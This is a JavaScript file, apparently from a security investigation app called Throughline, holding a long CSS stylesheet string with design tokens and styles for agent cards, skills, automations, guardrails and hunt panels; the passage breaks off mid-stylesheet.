/* Throughline — investigation OS. Ported from the original single-file prototype.
   Mounted by Throughline.dc.html. Google Fonts swapped for local EUI Inter. */
const TL_CSS = "\n@font-face{font-family:'Inter';font-style:normal;font-weight:300;font-display:swap;src:url('fonts/Inter-Light.woff2') format('woff2')}\n@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url('fonts/Inter-Regular.woff2') format('woff2')}\n@font-face{font-family:'Inter';font-style:normal;font-weight:500;font-display:swap;src:url('fonts/Inter-Medium.woff2') format('woff2')}\n@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url('fonts/Inter-SemiBold.woff2') format('woff2')}\n@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url('fonts/Inter-Bold.woff2') format('woff2')}\n\n\n/* ============================================================\n   THROUGHLINE — EUI/Borealis grounded, elevated\n   Tokens\n   ============================================================ */\n:root{\n  /* neutrals (Borealis-ish slate) */\n  --ink-0:#15171c; --ink-1:#2b2f38; --ink-2:#4a505d; --ink-3:#69707d; --ink-4:#98a0b0; --ink-5:#c3c9d6;\n  --bg:#f5f6fa; --bg-2:#eef0f6; --panel:#ffffff; --panel-2:#fbfcfe;\n  --line:#e6e9f0; --line-2:#d6dbe6; --line-strong:#c2c9d6;\n  /* product primary (stable brand/action blue) */\n  --blue:#0b64dd; --blue-d:#0a55bd; --blue-bg:#e8f1fd; --blue-ring:rgba(11,100,221,.35);\n  /* semantic */\n  --green:#149a6f; --green-bg:#e4f5ee;\n  --teal:#0e9ca0; --teal-bg:#e2f4f4;\n  --amber:#c0820f; --amber-bg:#fbf2dd;\n  --red:#c42e3a; --red-bg:#fcebec; --red-d:#a3242f;\n  --violet:#7a4fd0; --violet-bg:#f1ebfb;\n  /* type colors */\n  --t-case:#0b64dd; --t-inv:#0e9ca0; --t-hunt:#7a4fd0; --t-incident:#c42e3a; --t-custom:#5a6270;\n  /* mode accent (agent identity) — defaults DAY */\n  --accent:#e0892b; --accent-d:#a96414; --accent-bg:#fbf0e1; --accent-ring:rgba(224,137,43,.30);\n  /* radius / shadow / space */\n  --r-xs:5px; --r-sm:7px; --r-md:10px; --r-lg:14px; --r-pill:999px;\n  --shell:#edecea; --shell-line:#e4e2de; --rail-w:64px;\n  --sh-xs:0 1px 2px rgba(20,25,40,.06);\n  --sh-sm:0 1px 2px rgba(20,25,40,.05),0 2px 5px rgba(20,25,40,.05);\n  --sh-md:0 4px 14px rgba(20,25,40,.10),0 2px 6px rgba(20,25,40,.06);\n  --sh-lg:0 18px 50px rgba(20,25,40,.18),0 4px 12px rgba(20,25,40,.08);\n  --mono:\"JetBrains Mono\",ui-monospace,SFMono-Regular,Menlo,monospace;\n  --sans:\"Inter\",-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,sans-serif;\n}\nbody.mode-night{\n  --accent:#6e5fe0; --accent-d:#473ba6; --accent-bg:#edebfb; --accent-ring:rgba(110,95,224,.30);\n  --bg:#f4f4fb; --bg-2:#ecebf7; --shell:#eae8f4; --shell-line:#e0def0;\n}\n*{box-sizing:border-box;margin:0;padding:0}\nhtml,body{height:100%}\nbody{font-family:var(--sans);color:var(--ink-1);background:var(--bg);font-size:13.5px;line-height:1.5;\n  -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;overflow:hidden;\n  transition:background .5s ease}\nbutton{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}\ninput,textarea{font-family:inherit;font-size:inherit}\n::selection{background:var(--blue-ring)}\nsvg{display:block}\n.mono{font-family:var(--mono)}\n\n/* scrollbars */\n*::-webkit-scrollbar{width:9px;height:9px}\n*::-webkit-scrollbar-thumb{background:var(--line-2);border-radius:99px;border:2px solid transparent;background-clip:padding-box}\n*::-webkit-scrollbar-thumb:hover{background:var(--line-strong)}\n\n/* ============================================================ APP SHELL */\n.app{display:flex;flex-direction:column;height:100%;min-height:0;overflow:hidden;flex:1;min-width:0;background:var(--panel);border:1px solid var(--shell-line);border-radius:var(--r-lg);box-shadow:var(--panel-shadow, 0 1px 3px rgba(20,23,28,.05),0 10px 30px rgba(20,23,28,.06))}\n.app[hidden]{display:none}\n.shell{display:flex;height:100vh;width:100%;background:var(--shell);overflow:hidden}\n.rail{width:var(--rail-w);flex:0 0 auto;display:flex;flex-direction:column;align-items:stretch;padding:10px 8px;gap:2px;overflow-y:auto;overflow-x:hidden;scrollbar-width:none}\n.rail::-webkit-scrollbar{display:none}\n.rail.labeled{width:88px}\n.rail-top{display:flex;flex-direction:column;gap:2px}\n.rail-bottom{margin-top:auto;display:flex;flex-direction:column;gap:2px;padding-top:8px}\n.rail-sep{height:1px;background:var(--shell-line);margin:6px 10px}\n.rail-item{display:flex;flex-direction:column;align-items:center;gap:3px;padding:8px 2px;border-radius:var(--r-md);color:var(--ink-3);transition:.12s;cursor:pointer}\n.rail-item:hover{background:rgba(20,23,28,.05);color:var(--ink-1)}\n.rail-item .rii{display:grid;place-items:center;width:24px;height:24px}\n.rail-item .ril{font-size:10px;font-weight:600;line-height:1.05;text-align:center;white-space:nowrap;max-width:76px;overflow:hidden;text-overflow:ellipsis}\n.rail-item.on{background:var(--panel);color:var(--accent-d);box-shadow:0 1px 2px rgba(20,23,28,.08)}\n.rail-item.on .rii{color:var(--accent)}\n.rail-item.sol .rii{color:var(--accent)}\n.rail-item.more{color:var(--ink-4)}\n.rav{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,#3a4150,#22262e);color:#fff;display:grid;place-items:center;font-size:9px;font-weight:700}\n.stage{flex:1;min-width:0;min-height:0;display:flex;padding:8px}\n.navpanel{flex:0 0 auto;width:272px;margin-right:8px;display:flex;flex-direction:column;min-height:0;overflow:hidden;background:var(--panel);border:1px solid var(--shell-line);border-radius:var(--r-lg);box-shadow:var(--panel-shadow, 0 1px 3px rgba(20,23,28,.05),0 10px 30px rgba(20,23,28,.06));transition:width .28s cubic-bezier(.4,0,.2,1),opacity .2s ease,margin-right .28s cubic-bezier(.4,0,.2,1);will-change:width}\n.navpanel.collapsed{width:0;margin-right:0;opacity:0;border-color:transparent;box-shadow:none;pointer-events:none}\n.navpanel[hidden]{display:none}\n.apppage{flex:1;min-width:0;min-height:0;display:flex;flex-direction:column;overflow:hidden;background:var(--panel);border:1px solid var(--shell-line);border-radius:var(--r-lg);box-shadow:var(--panel-shadow, 0 1px 3px rgba(20,23,28,.05),0 10px 30px rgba(20,23,28,.06))}\n.apppage[hidden]{display:none}\n.page-head{flex:0 0 auto;height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 20px;border-bottom:1px solid var(--line)}\n.page-title{display:flex;align-items:center;gap:10px;font-size:16px;font-weight:650;color:var(--ink-0)}\n.page-title svg{color:var(--ink-3)}\n.page-sub{font-size:11.5px;font-weight:500;color:var(--ink-4);margin-left:4px}\n.page-actions{display:flex;align-items:center;gap:8px}\n.pill-btn{display:inline-flex;align-items:center;gap:7px;height:34px;padding:0 14px;border-radius:var(--r-pill);font-size:12.5px;font-weight:600;background:var(--ink-0);color:#fff;border:1px solid var(--ink-0);transition:.13s;cursor:pointer}\n.pill-btn:hover{filter:brightness(1.25)}\n.pill-btn svg{opacity:.85}\n.pill-btn.ghost{background:var(--panel);color:var(--ink-1);border-color:var(--line-strong)}\n.pill-btn.ghost:hover{background:var(--bg-2)}\n.page-body{flex:1;min-height:0;overflow-y:auto;display:flex;flex-direction:column}\n.page-pad{padding:18px 20px;flex:1;min-height:0;overflow-y:auto}\n/* ---- rail: agent cluster ---- */\n.rail-eyebrow{font-size:8.5px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:var(--ink-4);text-align:center;padding:2px 0 4px}\n/* ---- control-plane shared ---- */\n.ctl-intro{font-size:13px;line-height:1.55;color:var(--ink-2);max-width:760px;margin-bottom:18px}\n.ctl-sech{display:flex;align-items:baseline;gap:10px;margin-bottom:12px}\n.ctl-sech h3{font-size:15px;font-weight:700;color:var(--ink-0)}\n.ctl-count{font-size:12px;color:var(--ink-3)}\n.pill-btn.sm{height:28px;padding:0 11px;font-size:11.5px}\n/* ---- Agents ---- */\n.agrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:14px}\n.agcard{border:1px solid var(--line);border-radius:var(--r-lg);background:var(--panel);padding:16px;box-shadow:var(--sh-xs);display:flex;flex-direction:column;gap:13px}\n.agcard.day{border-top:3px solid var(--amber)}\n.agcard.night{border-top:3px solid var(--violet)}\n.agcard.muted{border-top:3px solid var(--line-strong)}\n.ag-h{display:flex;align-items:center;gap:11px}\n.ag-ic{width:38px;height:38px;border-radius:10px;display:grid;place-items:center;color:#fff;flex:0 0 auto}\n.ag-ic.day{background:linear-gradient(135deg,#e89a3f,#d2761c)}\n.ag-ic.night{background:linear-gradient(135deg,#7b6ce8,#564ab6)}\n.ag-ic.muted{background:var(--ink-4)}\n.ag-id{flex:1;min-width:0}\n.ag-name{font-size:15px;font-weight:700;color:var(--ink-0)}\n.ag-dom{font-size:12px;color:var(--ink-3)}\n.ag-status{font-size:11px;font-weight:700;padding:3px 9px;border-radius:var(--r-pill)}\n.ag-status.on{background:color-mix(in srgb,var(--green) 14%,transparent);color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n.ag-status.draft{background:var(--bg-2);color:var(--ink-3)}\n.ag-aut{display:flex;align-items:center;gap:9px;padding:10px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line)}\n.ag-aut-l{font-size:11px;color:var(--ink-3);text-transform:uppercase;letter-spacing:.04em;font-weight:600}\n.aut{display:inline-flex;gap:3px}\n.aut i{width:18px;height:6px;border-radius:3px;background:color-mix(in srgb,var(--tone,var(--accent)) 16%,var(--bg-2));display:block}\n.aut i.on{background:var(--tone,var(--accent))}\n.ag-aut-t{font-size:12px;color:var(--ink-1);font-weight:500}\n.ag-meta{display:grid;grid-template-columns:1fr 1fr;gap:9px 14px}\n.agm{display:flex;flex-direction:column;gap:2px}\n.agm.wide{grid-column:1/-1}\n.agm-k{font-size:10.5px;color:var(--ink-4);text-transform:uppercase;letter-spacing:.03em}\n.agm-v{font-size:12.5px;color:var(--ink-1)}\n.ag-foot{display:flex;gap:8px;margin-top:2px}\n.agcard.new{align-items:center;justify-content:center;text-align:center;border-style:dashed;cursor:pointer;gap:6px;min-height:200px}\n.agcard.new:hover{background:var(--bg-2);border-color:var(--accent-ring)}\n.agnew-ic{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;background:var(--accent-bg);color:var(--accent-d)}\n.agnew-t{font-size:14px;font-weight:700;color:var(--ink-0)}\n.agnew-d{font-size:12px;color:var(--ink-3);max-width:200px}\n/* ---- Skills ---- */\n.skill-list{display:flex;flex-direction:column;gap:8px}\n.skill-row{display:flex;align-items:flex-start;gap:13px;padding:13px 15px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);box-shadow:var(--sh-xs)}\n.skill-row.off{opacity:.6}\n.skill-row .sw{margin-top:1px;cursor:pointer}\n.sk-main{flex:1;min-width:0}\n.sk-top{display:flex;align-items:center;gap:9px;margin-bottom:3px}\n.sk-name{font-size:13.5px;font-weight:600;color:var(--ink-0)}\n.sk-cat{font-size:10.5px;font-weight:600;color:var(--ink-3);background:var(--bg-2);padding:2px 8px;border-radius:var(--r-pill)}\n.sk-v{font-size:11px;color:var(--ink-4)}\n.sk-desc{font-size:12px;color:var(--ink-2);line-height:1.45}\n.sk-meta{display:flex;flex-direction:column;align-items:flex-end;gap:6px;flex:0 0 auto}\n.sk-agents{display:flex;gap:5px}\n.sk-chip{display:inline-flex;align-items:center;gap:4px;font-size:10.5px;font-weight:600;padding:2px 8px;border-radius:var(--r-pill)}\n.sk-chip.day{background:color-mix(in srgb,var(--amber) 16%,transparent);color:color-mix(in srgb,var(--amber) 62%,#241500)}\n.sk-chip.night{background:color-mix(in srgb,var(--violet) 16%,transparent);color:var(--violet)}\n.sk-gated{font-size:10.5px;font-weight:600;color:var(--red-d);display:inline-flex;align-items:center;gap:4px}\n.conn-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:9px}\n.conn-row{display:flex;align-items:center;gap:11px;padding:11px 13px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel)}\n.conn-ic{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;background:var(--bg-2);color:var(--ink-2);flex:0 0 auto}\n.conn-main{flex:1;min-width:0;display:flex;flex-direction:column;gap:1px}\n.conn-name{font-size:12.5px;font-weight:600;color:var(--ink-0)}\n.conn-use{font-size:11px;color:var(--ink-3)}\n.conn-status{font-size:11px;font-weight:600;color:var(--ink-3);display:inline-flex;align-items:center;gap:6px}\n.conn-status .cdot{width:7px;height:7px;border-radius:50%;background:var(--ink-4)}\n.conn-status.on{color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n.conn-status.on .cdot{background:var(--green)}\n/* ---- Automations ---- */\n.auto-list{display:flex;flex-direction:column;gap:12px}\n.auto-card{border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);padding:16px 18px;box-shadow:var(--sh-xs)}\n.auto-card.off{opacity:.6}\n.auto-h{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;gap:12px}\n.auto-name{font-size:14px;font-weight:700;color:var(--ink-0)}\n.auto-r{display:flex;align-items:center;gap:12px}\n.auto-last{font-size:11px;color:var(--ink-4)}\n.apipe{display:flex;align-items:center;gap:9px;flex-wrap:wrap}\n.ap-node{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:500;padding:7px 11px;border-radius:var(--r-sm);border:1px solid var(--line)}\n.ap-node.trig{background:var(--bg-2);color:var(--ink-1)}\n.ap-node.trig.event{background:var(--blue-bg);color:var(--blue-d);border-color:var(--blue-ring)}\n.ap-node.agent{background:var(--panel);color:var(--ink-0);font-weight:600}\n.ap-node.out{background:var(--accent-bg);color:var(--accent-d);border-color:var(--accent-ring)}\n.ap-arrow{color:var(--ink-4);display:inline-flex}\n.ap-gate{display:inline-flex;align-items:center;gap:3px;margin-left:7px;font-size:10px;font-weight:700;color:var(--red-d);background:var(--red-bg);padding:1px 6px;border-radius:var(--r-pill)}\n/* ---- Activity ledger ---- */\n.act-stats{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}\n.act-stat{flex:1;min-width:110px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);padding:12px 14px}\n.act-stat .as-v{font-size:22px;font-weight:700;color:var(--ink-0);line-height:1}\n.act-stat .as-v.green{color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n.act-stat .as-v.red{color:var(--red-d)}\n.act-stat .as-k{font-size:11px;color:var(--ink-3);margin-top:5px}\n.act-tbl{width:100%;border-collapse:collapse;font-size:12.5px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);overflow:hidden}\n.act-tbl th{text-align:left;font-weight:600;color:var(--ink-3);font-size:10.5px;text-transform:uppercase;letter-spacing:.04em;padding:9px 14px;background:var(--bg-2);border-bottom:1px solid var(--line)}\n.act-tbl td{padding:10px 14px;border-bottom:1px solid var(--line);color:var(--ink-1);vertical-align:middle}\n.act-tbl tbody tr:last-child td{border-bottom:none}\n.act-time{color:var(--ink-3);white-space:nowrap}\n.act-agent{display:inline-flex;align-items:center;gap:5px;font-weight:600;color:var(--ink-0);white-space:nowrap}\n.act-src{color:var(--ink-2)}\n.act-tag{display:inline-block;font-size:10.5px;font-weight:700;padding:3px 8px;border-radius:var(--r-pill);white-space:nowrap}\n.act-tag.green{background:color-mix(in srgb,var(--green) 14%,transparent);color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n.act-tag.blue{background:var(--blue-bg);color:var(--blue-d)}\n.act-tag.amber{background:color-mix(in srgb,var(--amber) 18%,transparent);color:color-mix(in srgb,var(--amber) 62%,#241500)}\n.act-tag.red{background:var(--red-bg);color:var(--red-d)}\n.act-what{color:var(--ink-1)}\n.act-out{color:var(--ink-3);white-space:nowrap}\n.act-out.red{color:var(--red-d);font-weight:600}\n/* ---- Guardrails ---- */\n.gr-levels{display:flex;flex-direction:column;gap:8px}\n.gr-level{display:flex;align-items:flex-start;gap:12px;padding:13px 15px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);cursor:pointer;transition:.12s}\n.gr-level:hover{background:var(--bg-2)}\n.gr-level.on{border-color:var(--accent);background:var(--accent-bg)}\n.gr-radio{width:18px;height:18px;border-radius:50%;border:2px solid var(--line-strong);display:grid;place-items:center;flex:0 0 auto;margin-top:1px;color:#fff}\n.gr-level.on .gr-radio{background:var(--accent);border-color:var(--accent)}\n.gr-lt{display:flex;align-items:center;gap:9px;font-size:13.5px;font-weight:600;color:var(--ink-0);margin-bottom:3px}\n.gr-ld{font-size:12px;color:var(--ink-2);line-height:1.45}\n.gr-allow{display:flex;flex-direction:column;gap:8px}\n.gr-toggle{display:flex;align-items:flex-start;gap:12px;padding:12px 15px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel)}\n.gr-toggle .sw{margin-top:1px;cursor:pointer}\n.gr-tt{font-size:13px;font-weight:600;color:var(--ink-0);margin-bottom:2px}\n.gr-td{font-size:11.5px;color:var(--ink-3);line-height:1.4}\n.gr-tbl{width:100%;border-collapse:collapse;font-size:12.5px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);overflow:hidden}\n.gr-tbl th{text-align:left;font-weight:600;color:var(--ink-3);font-size:10.5px;text-transform:uppercase;letter-spacing:.04em;padding:9px 14px;background:var(--bg-2);border-bottom:1px solid var(--line)}\n.gr-tbl td{padding:10px 14px;border-bottom:1px solid var(--line);color:var(--ink-1)}\n.gr-tbl tbody tr:last-child td{border-bottom:none}\n.gr-pol{display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:700;padding:3px 9px;border-radius:var(--r-pill)}\n.gr-pol.gated{background:var(--red-bg);color:var(--red-d)}\n.gr-pol.auto{background:color-mix(in srgb,var(--green) 14%,transparent);color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n.gr-who{color:var(--ink-2)}\n.gr-scopes{display:flex;flex-wrap:wrap;gap:9px}\n.gr-scope{display:inline-flex;align-items:center;gap:8px;padding:8px 13px;border:1px solid var(--line);border-radius:var(--r-pill);background:var(--panel);font-size:12.5px;color:var(--ink-1)}\n.gr-scope .gs-dot{width:8px;height:8px;border-radius:50%}\n.gr-scope.full .gs-dot{background:var(--green)}\n.gr-scope.masked .gs-dot{background:var(--amber)}\n.gr-scope.denied .gs-dot{background:var(--ink-4)}\n.gr-scope .gs-l{font-size:11px;color:var(--ink-3);padding-left:7px;border-left:1px solid var(--line)}\n/* ---- nav prefs: agent mode ---- */\n.navp-am{display:flex;align-items:flex-start;gap:12px;padding:13px 14px;margin:8px 0 4px;border:1px solid var(--line-strong);border-radius:var(--r-md);background:var(--bg-2);cursor:pointer;transition:.13s}\n.navp-am.on{border-color:var(--accent);background:var(--accent-bg)}\n.navp-am .sw{margin-top:1px}\n.navp-am-t{display:flex;align-items:center;gap:7px;font-size:14px;font-weight:700;color:var(--ink-0);margin-bottom:3px}\n.navp-am-t svg{color:var(--accent-d)}\n.navp-am-d{font-size:12px;color:var(--ink-2);line-height:1.45}\n.navp-sec-x{font-size:11px;font-weight:500;color:var(--accent-d);background:var(--accent-bg);padding:2px 9px;border-radius:var(--r-pill);margin-left:8px}\n.navp-list.dim{opacity:.5}\n.navp-name{display:inline-flex;align-items:center;gap:7px;font-size:13.5px;font-weight:500;color:var(--ink-1)}\n.navp-name svg{color:var(--ink-3);flex:0 0 auto}\n.navp-back{position:fixed;inset:0;background:rgba(20,23,28,.4);z-index:400;display:grid;place-items:center;padding:24px;animation:fade .15s ease}\n@keyframes fade{from{opacity:0}to{opacity:1}}\n.navp{width:560px;max-width:100%;max-height:88vh;display:flex;flex-direction:column;background:var(--panel);border-radius:18px;box-shadow:var(--sh-lg);animation:pop .16s ease;overflow:hidden}\n.navp-h{display:flex;align-items:flex-start;justify-content:space-between;padding:24px 26px 4px}\n.navp-h h2{font-size:21px;font-weight:700;color:var(--ink-0);letter-spacing:-.01em}\n.navp-x{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;color:var(--ink-3)}\n.navp-x:hover{background:var(--bg-2);color:var(--ink-0)}\n.navp-body{overflow-y:auto;padding:6px 26px 4px}\n.navp-toggle{display:flex;align-items:center;gap:12px;padding:9px 0;font-size:14.5px;color:var(--ink-0);cursor:pointer}\n.sw{width:42px;height:24px;border-radius:999px;background:var(--ink-5);position:relative;flex:0 0 auto;transition:.16s}\n.sw::after{content:\"\";position:absolute;top:2px;left:2px;width:20px;height:20px;border-radius:50%;background:#fff;transition:.16s;box-shadow:0 1px 2px rgba(0,0,0,.2)}\n.sw.on{background:var(--accent)}\n.sw.on::after{left:20px}\n.navp-sec{font-size:17px;font-weight:700;color:var(--ink-0);margin:18px 0 12px}\n.navp-list{display:flex;flex-direction:column;gap:8px}\n.navp-row{display:flex;align-items:center;gap:12px;height:50px;padding:0 14px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);transition:border-color .12s,box-shadow .12s,opacity .12s}\n.navp-row.locked{background:var(--bg-2);border-color:transparent}\n.navp-row.hidden{opacity:.55}\n.navp-row.dragging{opacity:.35}\n.navp-row.dragover{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-ring)}\n.navp-grip{color:var(--ink-4);cursor:grab;display:grid;place-items:center}\n.navp-row.locked .navp-grip{cursor:default;color:var(--ink-3)}\n.navp-name{flex:1;font-size:14.5px;font-weight:500;color:var(--ink-0)}\n.navp-row.hidden .navp-name{color:var(--ink-3)}\n.navp-eye{width:30px;height:30px;border-radius:7px;display:grid;place-items:center;color:var(--ink-3);transition:.12s}\n.navp-eye:hover{background:var(--bg-2);color:var(--ink-0)}\n.navp-row.locked .navp-eye{color:var(--ink-4);cursor:default}\n.navp-foot{display:flex;justify-content:flex-end;padding:16px 26px 22px}\n.navp-apply{height:42px;padding:0 22px;border-radius:var(--r-md);font-size:14px;font-weight:650;background:var(--accent);color:var(--accent-on,#fff);border:1px solid var(--accent);transition:.13s;cursor:pointer}\n.navp-apply:hover{filter:brightness(1.05)}\n.hunt-bar{display:flex;align-items:center;gap:10px;background:var(--panel);border:1px solid var(--line-strong);border-radius:var(--r-md);padding:8px 12px;color:var(--ink-3)}\n.hunt-input{flex:1;border:none;outline:none;background:transparent;font-size:13.5px;color:var(--ink-0);font-family:var(--sans)}\n.hunt-saved{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:14px 0 18px}\n.hunt-saved .hs-l{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-4)}\n.hunt-chip{padding:6px 11px;border-radius:var(--r-pill);font-size:12px;font-weight:500;background:var(--bg-2);color:var(--ink-1);border:1px solid var(--line);transition:.12s;cursor:pointer}\n.hunt-chip:hover{border-color:var(--line-strong);color:var(--ink-0)}\n.stub-card{max-width:520px;margin:40px auto;text-align:center;display:flex;flex-direction:column;align-items:center;gap:12px;padding:32px;border:1px dashed var(--line-strong);border-radius:var(--r-lg);background:var(--panel)}\n.stub-card.sm{margin:24px 0}\n.stub-ic{color:var(--accent);display:grid;place-items:center}\n.stub-card h3{font-size:18px;font-weight:700;color:var(--ink-0)}\n.stub-card p{font-size:13px;line-height:1.6;color:var(--ink-3);max-width:420px}\n.stub-flow{display:flex;align-items:center;gap:10px;margin-top:8px;color:var(--ink-4)}\n.sf-node{padding:7px 14px;border-radius:var(--r-sm);background:var(--bg-2);color:var(--ink-1);font-size:12px;font-weight:600}\n\n.topbar{height:52px;flex:0 0 auto;display:flex;align-items:center;gap:14px;padding:0 16px;\n  background:var(--panel);border-bottom:1px solid var(--line);position:relative;z-index:40}\n.brand{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:-.02em;font-size:15px;color:var(--ink-0)}\n.brand .logo{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;color:#fff;\n  background:linear-gradient(150deg,var(--ink-0),#3a4150);box-shadow:var(--sh-sm);position:relative;overflow:hidden}\n.brand .logo::after{content:\"\";position:absolute;inset:0;background:radial-gradient(circle at 30% 20%,rgba(255,255,255,.25),transparent 60%)}\n.brand small{font-weight:500;color:var(--ink-4);font-size:11px;letter-spacing:.02em;margin-left:2px}\n\n/* mode switch */\n.modeswitch{display:flex;align-items:center;background:var(--bg-2);border:1px solid var(--line);border-radius:var(--r-pill);padding:3px;gap:2px}\n.modeswitch button{display:flex;align-items:center;gap:7px;padding:6px 13px;border-radius:var(--r-pill);font-weight:600;font-size:12.5px;color:var(--ink-3);transition:.18s}\n.modeswitch button .ic{opacity:.7;transition:.18s}\n.modeswitch button.on{color:#fff;box-shadow:var(--sh-sm)}\n.modeswitch button.on .ic{opacity:1}\n.modeswitch button[data-m=\"dayshift\"].on{background:linear-gradient(135deg,#e89a3f,#d2761c)}\n.modeswitch button[data-m=\"nightshift\"].on{background:linear-gradient(135deg,#7b6ce8,#564ab6)}\n\n.topbar .spacer{flex:1}\n.tb-btn{display:flex;align-items:center;gap:7px;height:33px;padding:0 12px;border-radius:var(--r-sm);\n  color:var(--ink-2);font-weight:500;font-size:12.5px;border:1px solid transparent;transition:.15s}\n.tb-btn:hover{background:var(--bg-2)}\n.tb-btn.ghost{border-color:var(--line)}\n\n/* user pill + permission popover */\n.userwrap{position:relative}\n.userpill{display:flex;align-items:center;gap:9px;height:36px;padding:0 6px 0 6px;border-radius:var(--r-pill);\n  border:1px solid var(--line);background:var(--panel-2);transition:.15s}\n.userpill:hover{box-shadow:var(--sh-sm);border-color:var(--line-2)}\n.avatar{width:26px;height:26px;border-radius:50%;display:grid;place-items:center;font-weight:700;font-size:11px;color:#fff;flex:0 0 auto}\n.userpill .meta{display:flex;flex-direction:column;line-height:1.15;padding-right:4px}\n.userpill .meta b{font-size:12px;font-weight:600;color:var(--ink-0)}\n.userpill .meta span{font-size:10.5px;color:var(--ink-3)}\n.userpill .sh{color:var(--green);margin-right:2px}\n.perm-pop{position:fixed;z-index:300;width:288px;background:var(--panel);border:1px solid var(--line);\n  border-radius:var(--r-md);box-shadow:var(--sh-lg);padding:14px;display:none;animation:pop .15s ease}\n.perm-pop.open{display:block}\n.pp-id{display:flex;align-items:center;gap:10px}\n.pp-id .avatar{width:34px;height:34px;font-size:12px;color:#fff;display:grid;place-items:center;border-radius:50%}\n.pp-idmeta{display:flex;flex-direction:column;line-height:1.2;flex:1}\n.pp-idmeta b{font-size:13px;font-weight:700;color:var(--ink-0)}\n.pp-idmeta span{font-size:11px;color:var(--ink-3)}\n.pp-id .sh{color:var(--green)}\n.perm-pop h4{font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:var(--ink-3);margin-bottom:9px;font-weight:600}\n.perm-row{display:flex;align-items:center;gap:9px;padding:5px 0;font-size:12.5px}\n.perm-row .pi{width:18px;display:grid;place-items:center}\n.perm-row.ok .pi{color:var(--green)} .perm-row.rev .pi{color:var(--blue)} .perm-row.no .pi{color:var(--ink-4)}\n.perm-row.no{color:var(--ink-4)}\n.perm-pop hr{border:none;border-top:1px solid var(--line);margin:9px 0}\n.perm-pop .note{font-size:11px;color:var(--ink-3);line-height:1.45}\n.rail-pop{position:fixed;z-index:300;width:236px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);box-shadow:var(--sh-lg);padding:8px;display:none;animation:pop .15s ease}\n.rail-pop.open{display:block}\n.rp-label{font-size:10px;text-transform:uppercase;letter-spacing:.06em;color:var(--ink-4);font-weight:700;padding:6px 8px 4px}\n.rp-modes{display:flex;gap:6px;padding:0 4px 2px}\n.rp-mode{flex:1;display:flex;align-items:center;justify-content:center;gap:6px;height:36px;border-radius:var(--r-sm);font-size:12px;font-weight:600;color:var(--ink-2);border:1px solid var(--line);background:var(--panel);transition:.13s;cursor:pointer}\n.rp-mode:hover{background:var(--bg-2);color:var(--ink-0)}\n.rp-mode.on{color:#fff;border-color:transparent}\n.rp-mode svg{opacity:.85}\n.rp-sep{height:1px;background:var(--line);margin:7px 4px}\n.rp-item{display:flex;align-items:center;gap:9px;width:100%;padding:9px 8px;border-radius:var(--r-sm);font-size:12.5px;font-weight:500;color:var(--ink-1);transition:.12s;cursor:pointer}\n.rp-item:hover{background:var(--bg-2);color:var(--ink-0)}\n.rp-item svg{color:var(--ink-3)}\n.panel-toggle{flex:0 0 auto;width:32px;height:30px;display:grid;place-items:center;border-radius:var(--r-sm);color:var(--ink-3);border:1px solid var(--line-2);background:var(--panel);transition:.12s;cursor:pointer}\n.panel-toggle:hover{border-color:var(--line-strong);background:var(--bg-2);color:var(--ink-1)}\n.panel-toggle.on{color:var(--accent);border-color:color-mix(in srgb,var(--accent) 35%,transparent);background:var(--accent-bg)}\n\n/* ============================================================ BODY 3-PANEL */\n.body{flex:1;display:flex;min-height:0}\n\n/* NAVIGATOR */\n.nav{width:270px;flex:1 1 0;background:transparent;display:flex;flex-direction:column;min-height:0}\n.nav-top{padding:16px 14px 6px}\n.newchat{width:100%;display:flex;align-items:center;justify-content:center;gap:8px;height:38px;border-radius:var(--r-sm);\n  background:var(--blue);color:#fff;font-weight:600;font-size:13px;box-shadow:var(--sh-sm);transition:.15s}\n.newchat:hover{background:var(--blue-d)}\n.nav-search{margin-top:9px;display:flex;align-items:center;gap:8px;height:32px;padding:0 10px;border-radius:var(--r-sm);\n  background:var(--bg-2);border:1px solid transparent;color:var(--ink-4)}\n.nav-search input{border:none;background:none;outline:none;flex:1;color:var(--ink-1);font-size:12.5px}\n.nav-scroll{flex:1;overflow-y:auto;padding:6px 10px 18px}\n.nav-group{margin-top:18px}\n.nav-group:first-child{margin-top:8px}\n.nav-group-h{display:flex;align-items:center;gap:8px;padding:8px 10px 9px;font-size:11px;font-weight:600;\n  